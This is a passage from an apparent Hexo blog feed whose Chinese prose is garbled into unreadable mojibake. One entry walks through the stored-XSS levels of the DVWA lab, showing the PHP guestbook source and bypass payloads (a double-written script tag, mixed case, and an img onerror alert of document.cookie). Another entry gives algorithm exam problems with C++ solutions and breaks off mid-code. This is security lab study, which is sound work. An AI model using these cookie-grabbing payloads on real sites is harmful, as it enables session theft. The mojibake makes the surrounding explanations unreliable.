æ²¡æœ‰è¿›è¡ŒXSSæ–¹é¢çš„è¿‡æ»¤å’Œæ£€æŸ¥ </p><p> ä¸”é€šè¿‡  <code>query</code> è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚æ‰€ä»¥å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´ </p><p>è¿™é‡Œname ,messageçš„è¾“å…¥æ¡†ä¸­éƒ½å­˜åœ¨xssï¼Œæ‰€ä»¥ä¸¤ä¸ªä½ç½®éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯nameä½ç½®æœ‰å­—æ•°é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨bpæŠ“åŒ…ä¿®æ”¹</p><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p><p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-202010262032"></p><p>ç”±äºæ˜¯å­˜å‚¨å‹XSS,æ‰€ä»¥æ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šå¼¹å‡ºcookieã€‚</p><h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    $message = strip_tags( addslashes( $message ) );    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    $message = htmlspecialchars( $message );    <span class="hljs-comment">// Sanitize name input</span>    $name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Update database</span>    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );$message = htmlspecialchars( $message );$name = str_replace( <span class="hljs-string">'&lt;script&gt;'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div><p> <code>strip_tags()</code> å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚ </p><p> <code>addslashes()</code> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </p><p> <code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  </p><p> å¯¹messageè¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç </p><p>ä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†<code>&lt;script&gt;</code>å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSï¼Œä¸åå°„å‹ä¸­çº§çš„ä¸€æ ·çš„æ–¹æ³•</p><p>payload</p><div class="hljs"><pre><code class="hljs django"><span class="xml">ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œè¾“å…¥  <span class="hljs-tag">&lt;<span class="hljs-name">scr</span>&lt;<span class="hljs-attr">script</span>&gt;</span>ipt&gt;alert(document.cookie)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><span class="xml">ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¾“å…¥<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><span class="xml">è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼Œå¦‚  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></span></code></pre></div><p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" srcset="/img/loading.gif" alt="xssstored2.png"></p><h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'btnSign'</span> ] ) ) &#123;    <span class="hljs-comment">// Get input</span>    $message = trim( $_POST[ <span class="hljs-string">'mtxMessage'</span> ] );    $name    = trim( $_POST[ <span class="hljs-string">'txtName'</span> ] );    <span class="hljs-comment">// Sanitize message input</span>    $message = strip_tags( addslashes( $message ) );    $message = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    $message = htmlspecialchars( $message );    <span class="hljs-comment">// Sanitize name input</span>    $name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );    $name = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));    <span class="hljs-comment">// Update database</span>    $query  = <span class="hljs-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );    <span class="hljs-comment">//mysql_close();</span>&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><div class="hljs"><pre><code class="hljs php">$message = strip_tags( addslashes( $message ) );$message = htmlspecialchars( $message );$name = preg_replace( <span class="hljs-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="hljs-string">''</span>, $name );</code></pre></div><p> <code>strip_tags()</code> å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚ </p><p> <code>addslashes()</code> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </p><p> <code>htmlspecialchars()</code> å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  </p><p>name,æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> æ˜¯æ­£åˆ™è¡¨è¾¾å¼ <code>(.*)</code> è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ<code>/i</code> è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº  <code>&lt;script&gt;</code> æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† ,å¯ä»¥ä½¿ç”¨å…¶ä»–çš„æ ‡ç­¾ã€‚</p><p>åªèƒ½æ¢ä¸€ä¸ªæ ‡ç­¾</p><div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>xss</tag>
      
      <tag>blind sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç®—æ³•ä¸Šæœºå¤ä¹ </title>
    <link href="/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/"/>
    <url>/2020/11/04/%E7%AE%97%E6%B3%95%E4%B8%8A%E6%9C%BA%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç®—æ³•å®éªŒè¦ä¸Šæœºè€ƒè¯•ï¼Œæ‰€ä»¥è¿˜æ˜¯å‡†å¤‡ä¸€ä¸‹å§(è¿˜ä¸æ˜¯å› ä¸ºè‡ªå·±å¤ªèœäº†)</p><a id="more"></a><h1 id="16çº§é¢˜ç›®"><a href="#16çº§é¢˜ç›®" class="headerlink" title="16çº§é¢˜ç›®"></a>16çº§é¢˜ç›®</h1><h2 id="é—®é¢˜-A-æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­"><a href="#é—®é¢˜-A-æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­" class="headerlink" title="é—®é¢˜ A: æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­"></a>é—®é¢˜ A: æ˜Ÿç©ºæ¢¦æƒ³â€”â€”é²ç­</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>é²ç­ä¸ƒå·æ˜¯ç‹è€…å³¡è°·é‡Œçš„å°„æ‰‹ï¼Œç«™æ’¸è‹±é›„ã€‚æˆ˜åœºä¸Šçš„é²ç­ä¸ƒå·ï¼Œæœºåˆ¶å¼ºå¤§çš„é²¨å˜´ç‚®ï¼Œç«‹åˆ»å°†æŒ¡åœ¨å‰è·¯çš„ä»»ä½•ç‰©ä½“è½°é£ã€‚æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œâ€œå€Ÿä½ ä»¬çš„è‚‰ä½“è¯•éªŒä¸‹æ–°å‘æ˜çš„å¨åŠ›â€ã€‚æ˜¯çš„ï¼Œè¿™å°±æ˜¯é²ç­å¤§å¸ˆå’Œä»–çš„å¤©æ‰æœºå…³é€ ç‰©é²ç­ä¸ƒå·ã€‚ç„¶è€Œï¼Œé²ç­æœ€ä¸ºè‡´å‘½çš„ç¼ºç‚¹æ˜¯è…¿çŸ­ï¼Œè·‘å¾—æ…¢ï¼Œä¸€ä¸ªç¨ä¸ç•™ç¥ï¼Œä¾¿ä¼šè¢«åˆºå®¢æ‰€å‡»æ€ã€‚</p><p>æ—¢ç„¶è…¿çŸ­ï¼Œé‚£ä¹ˆå°±æ¥å¤šå¤šè¿åŠ¨å§ï¼Œè·³è·³å°é˜¶å¯è¿˜è¡Œï¼Ÿå‡è®¾é²ç­ä¸ƒå·ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä½†æé™ä¸€æ¬¡åªèƒ½è·³ä¸Š2çº§å°é˜¶ï¼ˆè…¿çŸ­æ²¡åŠæ³•ï¼Œå˜¤å˜¤å˜¤ï¼‰ã€‚é²ç­ä¸ƒå·ç°åœ¨ä»0çº§é˜¶æ¢¯å¼€å§‹ï¼Œæœ€ç»ˆè·³ä¸Šç¬¬nçº§çš„å°é˜¶ï¼Œæ±‚æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ï¼Ÿ</p><h3 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=50ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=50ï¼‰ï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šäº†ç¬¬nçº§å°é˜¶ã€‚</p><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨é²ç­æœ€ç»ˆè·³ä¸Šç¬¬nçº§å°é˜¶çš„è·³æ³•ç§æ•°ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-number">50</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span><span class="hljs-number">5</span><span class="hljs-number">20365011074</span></code></pre></div><h3 id="æç¤º"><a href="#æç¤º" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>æ³¨æ„ç»“æœè¶…è¿‡intèŒƒå›´ï¼Œè¯·ç”¨long longç±»å‹å­˜å‚¨ans</p><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">50</span>;<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> f[N];<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;f[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>,f[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=<span class="hljs-number">50</span>;i++)&#123;f[i]=f[i<span class="hljs-number">-1</span>]+f[i<span class="hljs-number">-2</span>];&#125;<span class="hljs-keyword">int</span> n;<span class="hljs-built_in">cin</span>&gt;&gt;n;<span class="hljs-keyword">while</span>(n--)&#123;<span class="hljs-keyword">int</span> m;<span class="hljs-built_in">cin</span>&gt;&gt;m;<span class="hljs-built_in">cout</span>&lt;&lt;f[m]&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;</code></pre></div><h2 id="é—®é¢˜-B-åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ"><a href="#é—®é¢˜-B-åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ" class="headerlink" title="é—®é¢˜ B: åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ"></a>é—®é¢˜ B: åˆå¤œæ­Œå‰§â€”â€”å…ƒæ­Œ</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å…ƒæ­Œæ˜¯ç‹è€…å³¡è°·é‡Œçš„åˆºå®¢ã€‚ä½•è°“è‡³é«˜æœºå…³ä¹‹ç¾å‘¢ï¼Ÿå”¯æœ‰ä»¥è‡³é«˜æƒåŠ›çš„æ‰‹ä»¤å¤ªå¤å¥‡è¿¹é‡ç°äººä¸–ï¼Œæ–¹èƒ½ç§°å¾—ä¸Šå•Šã€‚</p><p>æ˜¯çš„ï¼Œå…ƒæ­Œæ“…é•¿æ“æ§ï¼Œæ‰€åšå‚€å„¡èƒ½èµ·åˆ°ä»¥å‡ä¹±çœŸçš„ä½œç”¨ï¼Œä»Šå¤©å…ƒæ­Œçš„å‚€å„¡å˜æˆä½ çš„åˆä¸­æ•°å­¦è€å¸ˆï¼Œç»™ä½ å‡ºä¸ªæ•°å­¦é¢˜ï¼šç»™ä½ ä¸€ä¸ªæ•°å­—xï¼Œè®©ä½ æ±‚å‡ºk7ã€k6ã€k5ã€k4ã€k3ã€k2ã€k1ã€k0ï¼ˆ0&lt;=ki&lt;=9ï¼‰ï¼Œä½¿å¾—ä»¥ä¸‹ç­‰å¼1æˆç«‹ï¼Œæœ€åæ ¹æ®ç­‰å¼2æ±‚å‡ºæœ€ç»ˆanså€¼ã€‚</p><p>ç­‰å¼1ï¼š</p><p><img src="https://s1.ax1x.com/2018/11/07/iTxDvF.png" srcset="/img/loading.gif" alt="img"></p><p>ç­‰å¼2ï¼š</p><p><img src="https://s1.ax1x.com/2018/11/07/iTxsu4.png" srcset="/img/loading.gif" alt="img"></p><h3 id="è¾“å…¥-1"><a href="#è¾“å…¥-1" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>ç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼ˆ1&lt;=T&lt;=1000ï¼‰ï¼Œä»£è¡¨æµ‹è¯•ç”¨ä¾‹ä¸ªæ•°ã€‚</p><p>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°xï¼ˆ1&lt;=x&lt;=1500000ï¼‰ã€‚</p><h3 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨æœ€ç»ˆè¿ç®—ç»“æœã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">3</span><span class="hljs-number">7</span><span class="hljs-number">143</span><span class="hljs-number">3223193224</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">10</span><span class="hljs-number">151</span><span class="hljs-number">163311433223</span></code></pre></div><h3 id="æç¤º-1"><a href="#æç¤º-1" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>æµ‹è¯•æ•°æ®å‡å¤§äºç­‰äº1ï¼Œä¸ç”¨ç‰¹åˆ¤0</p><p>æ„Ÿè§‰å›¾ç‰‡ç­‰å¼æœ‰ç‚¹é—®é¢˜ï¼Œä¸€å¼€å§‹æ²¡ç†è§£ä»€ä¹ˆæ„æ€ï¼Œåæ¥çœ‹äº†å­¦é•¿çš„æç¤ºã€‚æœ¬è´¨å°±æ˜¯è¿›åˆ¶è½¬æ¢ã€‚</p><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-keyword">int</span> t,m;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> c,r;r=n%<span class="hljs-number">7</span>;c=n/<span class="hljs-number">7</span>;<span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">0</span>)&#123;convert(c);<span class="hljs-built_in">cout</span>&lt;&lt;r;&#125;<span class="hljs-keyword">else</span><span class="hljs-built_in">cout</span>&lt;&lt;n;&#125; <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">cin</span>&gt;&gt;t;<span class="hljs-keyword">while</span>(t--)&#123;<span class="hljs-built_in">cin</span>&gt;&gt;m;convert(m);<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;</code></pre></div><h2 id="é—®é¢˜-C-åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰"><a href="#é—®é¢˜-C-åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰" class="headerlink" title="é—®é¢˜ C: åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰"></a>é—®é¢˜ C: åœ£è¯æ‹æ­Œâ€”â€”è²‚è‰</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>è²‚è‰æ˜¯ç‹è€…å³¡è°·é‡Œçš„æ³•å¸ˆ/åˆºå®¢ï¼Œè²‚è‰æ‰“æ³•ä¸€å®šè¦æ³¨æ„é…åˆæŠ€èƒ½ä¸è¢«åŠ¨ã€‚åŠè‚‰å‡ºè£…åŠ ä¸Šè›‡çš®èµ°ä½ï¼Œå¾€å¾€å¯ä»¥1æ‰“5ï¼Œè½»æ¾æ‹¿ä¸‹5æ€ã€‚è¯­èŠ±å°è¢«åŠ¨æè¿°ä¸ºï¼šæŠ€èƒ½å‘½ä¸­ä¼šä¸ºæ•Œäººå åŠ èŠ±ä¹‹å°è®°ï¼Œå åŠ æ»¡4å±‚åå°è®°è§¦å‘è¢«åŠ¨ï¼Œä¼šç»™è‡ªèº«å›å¤ç”Ÿå‘½ï¼ŒåŒæ—¶ä¼šå¯¹å‘¨å›´æ•Œäººé€ æˆçœŸå®ä¼¤å®³å¹¶å‡é€Ÿã€‚<br>æˆ‘ä»¬ç°åœ¨å¯¹è²‚è‰çš„æŠ€èƒ½åŠè¢«åŠ¨è¿›è¡Œç®€åŒ–å¦‚ä¸‹ï¼šæ¯ä½¿ç”¨1æ¬¡æŠ€èƒ½ä¼šæ”»å‡»1æ¬¡ç›®æ ‡ï¼Œæ¯æ”»å‡»3æ¬¡ç›®æ ‡ï¼Œä¼šè‡ªåŠ¨é¢å¤–æ”»å‡»1æ¬¡ç›®æ ‡ã€‚<br>ç°åœ¨ï¼Œè²‚è‰åœ¨æ¸¸æˆä¸­ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ï¼Œè¯·é—®æ€»å…±ä¼šç»™ç›®æ ‡å¸¦æ¥å¤šå°‘æ¬¡æ”»å‡»ã€‚</p><h3 id="è¾“å…¥-2"><a href="#è¾“å…¥-2" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h3><p>å¤šç»„æµ‹è¯•æ•°æ®ï¼Œç¬¬ä¸€è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°Tï¼Œä»£è¡¨æµ‹è¯•æ ·ä¾‹ä¸ªæ•°ã€‚<br>æ¥ä¸‹æ¥Tè¡Œï¼Œæ¯è¡Œè¾“å…¥åŒ…å«ä¸€ä¸ªæ•´æ•°nï¼ˆ1&lt;=n&lt;=100ï¼‰ï¼Œä»£è¡¨è²‚è‰ä½¿ç”¨äº†næ¬¡æŠ€èƒ½ã€‚</p><h3 id="è¾“å‡º-2"><a href="#è¾“å‡º-2" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><p>æ¯ç»„æµ‹è¯•ç”¨ä¾‹å¯¹åº”ä¸€è¡Œè¾“å‡ºï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°ansï¼Œä»£è¡¨è²‚è‰å¯¹ç›®æ ‡è¿›è¡Œäº†ansæ¬¡æ”»å‡»ã€‚</p><h3 id="æ ·ä¾‹è¾“å…¥-2"><a href="#æ ·ä¾‹è¾“å…¥-2" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">6</span><span class="hljs-number">1</span><span class="hljs-number">2</span><span class="hljs-number">3</span><span class="hljs-number">45</span><span class="hljs-number">81</span></code></pre></div><h3 id="æ ·ä¾‹è¾“å‡º-2"><a href="#æ ·ä¾‹è¾“å‡º-2" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-number">2</span><span class="hljs-number">4</span><span class="hljs-number">57</span><span class="hljs-number">121</span></code></pre></div><h3 id="æç¤º-2"><a href="#æç¤º-2" class="headerlink" title="æç¤º"></a>æç¤º</h3><p>è¿™é¢˜å°±æ˜¯æ±½æ°´ç“¶çš„æ”¹ç¼–ã€‚ã€‚ã€‚</p><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span 